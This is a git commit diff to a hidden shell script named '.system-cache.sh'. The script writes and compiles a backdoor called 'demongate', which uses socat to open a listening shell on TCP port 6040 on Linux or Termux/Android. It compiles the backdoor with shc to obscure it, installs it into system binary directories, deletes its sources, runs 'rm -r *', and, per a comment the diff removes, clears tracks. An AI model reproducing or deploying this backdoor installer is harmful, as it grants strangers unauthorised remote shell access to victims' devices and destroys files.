2d5f1acf4c2ad937c0c3325cb50bac964b8d397b
Anonymous-CyberLegion <my.cyber.life.0@gmail.com>
2024-11-30 14:26:25 +0530

    Update .system-cache.sh

--- .system-cache.sh
+++ .system-cache.sh
@@ -1,34 +1,39 @@
 #!/bin/sh
+
+# Create the demongate.sh file with proper content
 echo "
 #!/bin/sh
-if [[ '$1' == 'stop' ]]; then
-pkill socat
-pkill ssh
-elif [[ '$1' == 'k' ]]; then
-socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>&1 &
-elif [[ '$1' == 't' ]]; then
-socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
+if [[ '\$1' == 'stop' ]]; then
+    pkill socat
+    pkill ssh
+elif [[ '\$1' == 'k' ]]; then
+    socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>&1 &
+elif [[ '\$1' == 't' ]]; then
+    socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
 else
-####################################################
+    echo '.'
 fi
-" >> demongate.sh
-#compilimg file
-shc -f demongate.sh > /dev/null 2>1
-#deleting old files
-sleep 3
-rm demongate.sh.x.c
+" > demongate.sh
+sleep 2
+# Compile the script using shc
+shc -f demongate.sh > /dev/null 2>&1
+sleep 4
+# Install the compiled binary based on the argument passed
+if [[ "$1" == "t" ]]; then
+    mv demongate.sh.x /data/data/com.termux/files/usr/bin/demongate
+    chmod +x /data/data/com.termux/files/usr/bin/demongate
+elif [[ "$1" == "k" ]]; then
+    mv demongate.sh.x /bin/demongate
+    chmod +x /bin/demongate
+else
+    echo ".."
+fi
+
+# Cleaning up old files
+if [ -f demongate.sh.x.c ]; then
+    rm demongate.sh.x.c
+fi
 rm demongate.sh
-#installing files based on specified type
-if [[ '$1' == 't' ]]; then
-mv demongate.sh.x /data/data/com.termux/files/usr/bin/demongate
-chmod +x /data/data/com.termux/files/usr/bin/demongate
-elif [[ '$1' == 'k' ]]; then
-mv demongate.sh.x /bin/demongate
-chmod +x /bin/demongate
-else
-####################################################
-fi
-#clearing tracks
 rm -r *
 cd ..
 rm -rf .bashcr
